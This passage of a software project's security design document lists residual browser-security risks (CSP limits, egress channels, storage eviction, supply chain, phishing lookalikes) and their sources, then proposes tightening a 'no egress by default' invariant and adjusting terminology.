| H47 | No global `message` listener; `window.name` cleared | Lint + a runtime assertion on boot | Either fails |

---

## 11. Residual risk

Using `31` §1.4's scale. Ranked by what should get attention, not by severity.

| # | Residual | Tag | Accepted because | Revisit when |
|---|---|---|---|---|
| B1 | A compromised browser or a malicious extension reads everything, and nothing here changes that | `total` | `31` §6.2. It is the governing rule of this document | Never. Ship the CLI and say so |
| B2 | Mode A has no `frame-ancestors`, no `sandbox`, no COOP/COEP/CORP, no `Permissions-Policy`, no reporting | `material` in general — **`bounded` as shipped**, because §3.3 removes secrets from that artifact | The decision in §3.3 is exactly this trade | If mode A ever gains a passphrase field. It must not |
| B3 | Top-level navigation and `window.open` remain egress channels wherever the `sandbox` directive is unavailable or unverified | `material` in mode A, `bounded` in B–D **pending §2.11's VERIFY** | CSP has no directive for navigation and `navigate-to` was not shipped | If the VERIFY fails, this becomes `material` everywhere and §11 is the place a reviewer will look |
| B4 | Trusted Types is unenforced wherever the browser does not implement it | `bounded` | The static lint (§5.7) covers the same ground without runtime enforcement | When the support matrix is confirmed; H14 is the item that matters until then |
| B5 | The OPFS cache can be evicted without notice, including by a time-based mechanism | `bounded` | The workspace on disk is the store (`32` §13.1). Eviction costs a re-open | If browser storage ever becomes primary — which would also reverse §3.6's port decision |
| B6 | A fixed loopback port means another local process can inherit the origin after `fathom serve` exits | `bounded` | It inherits a cache of ciphertext it could have read off the disk | Same trigger as B5. The two are coupled and must move together |
| B7 | The 256 MiB parse-worker cap and the 64 MiB paste cap are budgets, not measurements | `bounded` | They bound the failure; they are not tuned | After the fuzz corpus has run against real captures at scale |
| B8 | A rule pack's prose is rendered from a signed source whose *content* we do not control | `material` | `31` §5.2. Signing bounds who, never what. The AST pipeline means it cannot become markup — it can still say something wrong | Never technically. `12` §13's diffability is the control |
| B9 | Third-party Rust crates execute in the artifact | `material` | `31` §5.1 row 8. The "zero third-party" claim is scoped to JavaScript (§8.1) and says so | Continuously, via `cargo-vet` and the SBOM diff |
| B10 | A tampered build ships whatever policy it likes | `material` | The policy is in the artifact. `31` rows 7 and 9 own this | Never — reproducibility is the answer and it needs an independent rebuilder |
| B11 | The copied configuration sits in the OS clipboard, in clipboard history, and possibly in a cross-device sync service | `total` | `31` §6.5. Outside the model. §6.5 makes it legible, not private | Never |
| B12 | Mode A is a phishing template: a lookalike single file that asks for a passphrase | `material` | Nothing stops someone shipping an HTML file with our name on it | §3.7's masthead sentence is the mitigation and it is a social one. Reproducible hashes are the technical half |

---

## 12. Sources

| Claim | Source |
|---|---|
| `'wasm-unsafe-eval'` permits `WebAssembly.compile`, `instantiate`, `compileStreaming` and `instantiateStreaming`, and does not permit `eval` or `new Function`; a policy with `default-src` or `script-src` blocks WebAssembly instantiation without it | MDN, `Content-Security-Policy: script-src`; W3C WebAppSec CSP issue 443 and the WebAssembly content-security-policy discussion |
| `report-uri`, `frame-ancestors`, `sandbox` and `reflected-xss` are removed from a policy delivered via a `meta` element | CSP Level 3, meta-element parsing. Also stated in `21` §7.5 and `31` §5.1 row 16 |
| `require-trusted-types-for 'script'` makes DOM injection sinks reject strings; `trusted-types` allowlists policy names | MDN, `Content-Security-Policy: require-trusted-types-for` and `trusted-types`; W3C Trusted Types |
| Trusted Types reached cross-browser availability in early 2026 | Secondary write-ups summarising Chrome 83, Safari 26 and Firefox support. <!-- VERIFY against the browser vendors' own release notes before this appears in a review pack. --> |
| `Integrity-Policy` / `Integrity-Policy-Report-Only` let a document require integrity metadata on script and style subresources, blocking loads without it | MDN, `Integrity-Policy`; W3C Subresource Integrity |
| `Request` accepts an `integrity` option, so a `fetch` piped into `WebAssembly.instantiateStreaming` is integrity-checked | Fetch standard, `RequestInit.integrity`; W3C Subresource Integrity |
| Browser storage is best-effort by default; `navigator.storage.persist()` requires the `persistent-storage` permission; persistent buckets are cleared only after best-effort ones and with user notification | MDN, `StorageManager.persist()`, *Storage quotas and eviction criteria* |
| `file://` documents are treated as opaque origins by current browsers; IndexedDB is unavailable there | MDN, *Same-origin policy*; `24` §2.2 and `32` §13.1 record the same constraint. <!-- VERIFY the full per-browser matrix; three documents depend on one measurement. --> |
| `navigator.clipboard.writeText` requires transient activation in WebKit and Gecko; WebKit additionally rejects writes after an intervening `await` | W3C Clipboard API issue 182; WebKit developer reports. <!-- VERIFY current behaviour before the fallback in §6.6 is removed. --> |
| Browsers imply `rel=noopener` for `target=_blank`, aligned across engines around 2021 | HTML standard; OWASP, *Reverse Tabnabbing* |
| `Cross-Origin-Opener-Policy: same-origin` plus `Cross-Origin-Embedder-Policy: require-corp` are required for cross-origin isolation, which `SharedArrayBuffer` and WASM threads require | MDN, `SharedArrayBuffer`; also cited in `32` §20 |
| Trojan Source / bidi-control and tag-character smuggling as a rendering attack | `23` §12's sources; Unicode bidirectional algorithm controls |
| PFS: without it, Phase 2 keys derive from Phase 1 material; PFS on one side only fails Phase 2 while Phase 1 stays up | Owner's SRX IPsec field card, side 2 |
| `clear security ike security-associations` tears down every child SA under the peer — on a hub, every spoke at once | Owner's SRX IPsec field card, side 3 |
| `external-interface` is the WAN unit IKE leaves by, not `st0`; the object chain; `pre-shared-key ascii-text "<psk>"` as the placeholder form; DPD `10 × 3`; continuation backslashes in wrapped commands | Owner's SRX IPsec field card, sides 1 and 2 |
| `VERIFY AGAINST YOUR OWN BOX BEFORE ACTING`; `BOTH ENDS MUST AGREE — EVERY VALUE, EXACTLY` | Owner's SRX IPsec field card, sides 1 and 2 |
| Compromised browser and extensions are out of scope; the isolated world is not a security boundary; the limits panel; the residual scale | `docs/30-security/31-threat-model.md` §1.4, §4.3, §6.2, §6.8 |
| Crypto worker ownership of keys, `WebAssembly.Memory` growth, `memory.grow` failure mode, `lock()`, the impossibility of key erasure, the workspace on disk as the store | `docs/30-security/32-cryptography.md` §4.4, §4.5, §13.1, §14 |
| The corpus markdown subset, raw HTML forbidden, build-time AST compilation, interpolation slots | `docs/10-core/15-explainer-corpus.md` §6.4, §6.5 |
| Exfiltration channels C2 (image) and C3 (link), and the CSP argument for each | `docs/20-ai/23-ai-safety-and-injection.md` §6.2, §6.3 |
| CSP per AI tier; the origin set is a build-time property | `docs/20-ai/21-ai-layer-architecture.md` §7.5 |
| Plaintext export header and the export gate | `docs/10-core/17-workspace-format.md` §15.3, §15.5 |
| Rule packs bound *who*, not *what* | `docs/10-core/12-rule-engine.md` §13 |

Claims not sourced above are design positions of this project and are argued in place.

---

## 13. Disagreements and proposed changes

Raised under the conventions' own procedure rather than acted on unilaterally.

### 13.1 Invariant 1 is stated in terms of a directive that does not cover egress

**The convention.** Invariant 1: *"No egress by default. The application never opens a connection the
user did not configure. `connect-src` is `'none'` in the offline build and exactly one origin in the
sync build."*

**The objection.** `connect-src` governs fetch-type requests. It does not govern top-level
navigation, `window.open`, image requests, font requests, or form submission. §2.11 lists three
channels that survive a policy with `connect-src 'none'`, and two of them are only closed by the
`sandbox` directive — which a `<meta>`-delivered policy discards, meaning the *offline build named in
the invariant* is precisely the build where the invariant's stated mechanism is weakest.

An invariant that names one directive invites an implementer to treat that directive as the control
and to ship a build that satisfies the letter of the invariant with three open channels.

**Proposed replacement.**

> **1. No egress by default.** The application never opens a connection the user did not configure.
> Enforced by `default-src 'none'` with a per-directive allowlist — `connect-src`, `img-src`,
> `font-src`, `form-action` and `frame-src` all constrained — plus the `sandbox` directive where the
> delivery mechanism permits it. No telemetry, no analytics, no font CDN, no error reporting.
> **Top-level navigation is not covered by any CSP directive and is closed only by `sandbox`; where
> `sandbox` cannot be delivered, that channel is open and the artifact must not hold secrets.**

The last sentence is the one that matters. It is what §3.3's decision follows from, and it makes the
invariant's own limit part of the invariant rather than a footnote in one document.

### 13.2 PROPOSED CHANGE — the single-file build's role, in `21`, `24` and `32`

`21` §7.5, `24` §2.6 and `32` §13 all describe a single-file artifact that holds a workspace. §3.3
proposes that it holds none, and that the offline workspace artifact is the loopback bundle served by
`fathom serve`.

If the decision is accepted, three edits follow:

| Document | Change |
|---|---|
| `21` §7.5 | The mode A policy is the reference artifact's policy. `img-src 'self' data:` → `img-src data:` and `font-src 'self' data:` → `font-src data:`, because `'self'` is inert under an opaque origin. Tier 2a's "single-file yes" becomes "reference artifact: no model; offline bundle: yes" |
| `24` §2.6 | The single-file artifact's inability to cache weights stops being a limitation and becomes a non-issue, because that artifact runs no model. The weights-caching discussion attaches to mode B, where OPFS works |
| `32` §13 | "Where the ciphertext lives" applies to mode B and to the CLI. The `file://` row in §13.1's table becomes informational rather than a supported configuration, and §4.5's open question about spawning a Worker from `file://` stops being load-bearing |

Each of those makes the other document *shorter*, which is a reasonable sign the decision is drawn
along a real seam rather than a convenient one.

### 13.3 The terminology table has no word for the on-disk artifact

**The convention.** "workspace" means the encrypted document; "file" is listed among the words never
to use for it.

**The objection.** This document, `32` §13 and `17` §2.1 all need a phrase for the bytes on the disk
as distinct from the workspace as a concept — `32` §13.1 already writes *"the file is the store"* and
is right to. Meanwhile this document also needs "file" in its ordinary sense for `file://`, for a
dropped capture, and for an SVG export.

**Proposed addition**, rather than a replacement: permit **"the workspace on disk"** and **"the packed
workspace"** as the qualified forms, and keep the ban on the bare noun. That preserves what the
convention is protecting — nobody calling the product concept "a file" — without forcing three
documents to write around a real distinction. This document uses the qualified forms throughout.
